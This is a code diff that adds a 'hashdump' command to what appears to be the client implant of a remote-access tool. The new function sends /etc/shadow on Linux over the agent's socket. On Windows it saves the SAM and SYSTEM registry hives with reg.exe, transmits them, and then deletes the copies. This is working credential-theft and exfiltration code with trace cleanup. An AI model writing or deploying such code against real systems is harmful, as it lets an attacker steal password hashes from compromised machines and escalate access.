@@ -75,6 +75,9 @@ class AgentClient:
         elif cmd == "ipconfig":
             self._ipconfig()
 
+        elif cmd == "hashdump":
+            self._hashdump()
+
         elif cmd.startswith("search "):
             self._search_file(cmd)
 
@@ -160,6 +163,22 @@ class AgentClient:
             self.sock.sendall(b"DISPLAY\n" + str(len(output)).encode('utf-8') + b"\n" + output.encode('utf-8'))
         except Exception as e:
             logger.debug("[agent] Error in search %s", e)
+
+    def _hashdump(self):
+        import subprocess, platform
+
+        try:
+            if platform.system() == "Linux":
+                FileUtils.send_file(self.sock, "/etc/shadow")
+            elif platform.system() == "Windows":
+                subprocess.run(["cmd.exe", "/C", r"reg.exe save hklm\sam sam.save"])
+                subprocess.run(["cmd.exe", "/C", r"reg.exe save hklm\system system.save"])
+                FileUtils.send_file(self.sock, "sam.save")
+                FileUtils.send_file(self.sock, "system.save")
+                subprocess.run(["cmd.exe", "/C", r"del sam.save"])
+                subprocess.run(["cmd.exe", "/C", r"del system.save"])
+        except Exception as e:
+            logger.debug("[agent] Error in hashdump %s", e)
 
     def close(self):
         self.running = False
